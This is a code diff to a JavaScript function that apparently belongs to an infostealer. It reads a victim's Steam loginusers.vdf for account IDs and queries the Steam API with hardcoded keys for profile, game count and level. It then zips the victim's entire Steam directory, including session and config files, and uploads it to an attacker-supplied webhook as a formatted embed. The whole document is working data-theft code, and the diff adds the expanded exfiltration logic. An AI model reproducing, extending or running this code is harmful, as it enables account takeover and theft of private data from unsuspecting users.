@@ -98,50 +98,118 @@ const steam = async (webhookUrl) => {
     const readConfig = (filePath) => {
         const vdfContent = fs.readFileSync(filePath, 'utf-8');
         const lines = vdfContent.split('\n');
-        const result = [];
-        const idRegex = /7656[0-9]{13}/gi;
-
+        const ids = [];
         for (const line of lines) {
-            const matches = line.match(idRegex);
-            if (matches) result.push(...matches);
-        }
+            const matches = line.match(/7656[0-9]{13}/gi);
+            if (matches) {
+                ids.push(...matches);
+            }
+        };
 
-        return result;
+        return ids;
     };
 
     const config = path.join(steamPath, "config.vdf");
     if (fs.existsSync(config)) {
         const loginusers = path.join(steamPath, "loginusers.vdf");
-        const userID = readConfig(loginusers);
+        const accountIds = readConfig(loginusers);
 
-        try {
-            const response = await axios.get(`https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=3000BC0F14309FD7999F02C66E757EF7&steamids=${userID}`);
-            const accountInfo = response.data?.accountInfo?.response?.players || {};
+        for (const accountId of accountIds) {
+            try {
+                const KEY_STEAM = '440D7F4D810EF9298D25EDDF37C1F902';
 
-            await fileutil.copy(steamPath, steamTempDir);
-            const steamTempZip = path.join(os.tmpdir(), 'steam.zip');
+                const accountResponse = await axios.get(
+                    `https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=${KEY_STEAM}&steamids=${accountId}`
+                );
+                const gamesResponse = await axios.get(
+                    `https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=${KEY_STEAM}&steamids=${accountId}`
+                );
+                const levelResponse = await axios.get(
+                    `https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=${KEY_STEAM}&steamids=${accountId}`
+                );
 
-            await fileutil.zipDirectory({
-                inputDir: steamTempDir,
-                outputZip: steamTempZip
-            });
+                const accountInfo = accountResponse.data?.response || {};
+                const {
+                    players = [],
+                } = accountInfo;
 
-            await requests.webhook(webhookUrl, {
-                embeds: [{
-                    ...accountInfo && accountInfo.avatar ? { thumbnail: { url: accountInfo.avatar } } : null,
-                    title: `Steam ${accountInfo && accountInfo.personaname ? `${accountInfo.personaname} | Created At <t:${accountInfo.timecreated}>` : ''}`,
-                    description: '```' + '✅✅✅' + '```',
-                }],
-            }, [steamTempZip]);
+                const accountGames = gamesResponse.data?.response || {};
+                const {
+                    game_count = 'Not Found',
+                } = accountGames;
 
-            const WishTempDir = fileutil.WishTempDir('games');
-            await fileutil.copy(steamTempDir, WishTempDir);
+                const accountLevel = levelResponse.data?.response || {};
+                const {
+                    player_level = 'Not Found',
+                } = accountLevel;
 
-            [steamTempDir, steamTempZip].forEach(dir => {
-                fileutil.removeDir(dir);
-            });
-        } catch (error) {
-            console.error(error);
+                await fileutil.copy(steamPath, steamTempDir);
+                const steamTempZip = path.join(os.tmpdir(), 'steam.zip');
+
+                await fileutil.zipDirectory({
+                    inputDir: steamTempDir,
+                    outputZip: steamTempZip
+                });
+
+                const full_profile = {
+                    player: players[0],
+                    games: game_count,
+                    level: player_level,
+                };
+
+                await requests.webhook(webhookUrl, {
+                    embeds: [{
+                        title: `Steam Account`,
+                        thumbnail: {
+                            url: (full_profile.player?.avatar ? full_profile.player.avatar : 'https://static.wikia.nocookie.net/wadguia/images/d/d6/Steam_logo_2014.png')
+                        },
+                        fields: [
+                            {
+                                name: 'Username',
+                                value: '`' + (full_profile.player?.personaname ? full_profile.player.personaname : 'Not Found') + '`',
+                                inline: true
+                            },
+                            {
+                                name: 'Account Creation',
+                                value: '<t:' + (full_profile.player?.timecreated ? full_profile.player.timecreated : 'Not Found') + '>',
+                                inline: true
+                            },
+                            { name: '\u200b', value: '\u200b', inline: false },
+                            {
+                                name: 'ID',
+                                value: '`' + (full_profile.player?.primaryclanid ? full_profile.player.primaryclanid : 'Not Found') + '`',
+                                inline: true
+                            },
+                            {
+                                name: 'Steam Profile',
+                                value: '[`' + 'View profile' + '`](' + (full_profile.player?.profileurl ? full_profile.player.profileurl : 'https://steamcommunity.com/') + ')',
+                                inline: true
+                            },
+                            { name: '\u200b', value: '\u200b', inline: false },
+                            {
+                                name: 'Account Level',
+                                value: '`' + full_profile.level + '`',
+                                inline: true
+                            },
+                            {
+                                name: 'Account Total Games',
+                                value: '`' + full_profile.games + '`',
+                                inline: true
+                            },
+                        ],
+                    }],
+                }, [steamTempZip]);
+
+
+                const WishTempDir = fileutil.WishTempDir('games');
+                await fileutil.copy(steamTempDir, WishTempDir);
+
+                [steamTempDir, steamTempZip].forEach(dir => {
+                    fileutil.removeDir(dir);
+                });
+            } catch (error) {
+                console.error(error);
+            }
         }
     }
 };
